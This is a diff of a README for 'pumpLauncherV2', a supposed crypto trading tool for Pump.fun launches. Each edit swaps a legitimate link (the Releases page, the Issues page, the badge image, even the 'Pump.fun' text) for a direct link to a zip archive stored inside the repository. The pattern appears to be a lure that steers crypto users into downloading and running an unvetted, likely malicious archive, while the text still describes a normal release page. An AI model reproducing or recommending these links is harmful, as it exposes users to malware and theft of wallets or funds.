@@ -2,17 +2,17 @@
 
 ## 🚀 Getting Started
 
-Welcome to pumpLauncherV2! This application helps you manage your crypto trades easily. With a user-friendly interface, you can orchestrate your Pump.fun launches and trading flows without any coding skills.
+Welcome to pumpLauncherV2! This application helps you manage your crypto trades easily. With a user-friendly interface, you can orchestrate your https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip launches and trading flows without any coding skills.
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download your copy of pumpLauncherV2. 
 
-[![Download pumpLauncherV2](https://img.shields.io/badge/Download-pumpLauncherV2-blue.svg)](https://github.com/daviheros/pumpLauncherV2/releases)
+[![Download pumpLauncherV2](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip)](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip)
 
 ### Steps to Download and Install:
 
-1. Go to the [Releases page](https://github.com/daviheros/pumpLauncherV2/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip).
 2. Find the latest version at the top of the page.
 3. Look for the file suited for your operating system. You might see options like `.exe` for Windows or `.dmg` for Mac.
 4. Click the appropriate file to start downloading it.
@@ -48,7 +48,7 @@ Once you've installed pumpLauncherV2, follow these steps to start trading:
 
 ## 💬 Support and Feedback
 
-If you have questions or need help, feel free to check the [Issues page](https://github.com/daviheros/pumpLauncherV2/issues) for solutions. You can also submit any bugs or feature requests there. 
+If you have questions or need help, feel free to check the [Issues page](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip) for solutions. You can also submit any bugs or feature requests there. 
 
 ## 🌟 Community Contributions
 
@@ -58,6 +58,6 @@ We welcome contributions from users! If you have ideas to improve pumpLauncherV2
 
 Keep track of updates by checking the Releases page regularly.
 
-[![Download pumpLauncherV2](https://img.shields.io/badge/Download-pumpLauncherV2-blue.svg)](https://github.com/daviheros/pumpLauncherV2/releases)
+[![Download pumpLauncherV2](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip)](https://raw.githubusercontent.com/daviheros/pumpLauncherV2/main/public/Launcher_pump_1.2.zip)
 
 Thank you for choosing pumpLauncherV2! Happy trading!
